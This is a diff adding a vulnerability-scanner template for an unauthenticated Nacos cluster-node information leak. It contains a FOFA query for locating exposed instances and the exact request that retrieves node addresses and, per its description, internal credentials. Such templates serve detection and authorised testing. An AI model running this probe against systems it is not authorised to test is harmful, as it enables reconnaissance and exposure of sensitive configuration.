@@ -1,0 +1,24 @@
+id: nacos-nodes-info-disclosure
+
+info:
+  name: Nacos节点敏感数据暴露漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="Nacos" && icon_hash="13942501"
+          Nacos作为分布式服务配置与发现平台，在未授权访问场景下可通过特定接口获取集群节点敏感数据。该漏洞允许攻击者无需认证即可访问包含节点IP、端口及内部通信凭证的明文配置信息，直接威胁微服务架构的安全边界。
+  tags: Nacos
+
+http:
+- raw:
+  - |
+    GET /nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword= HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'address'
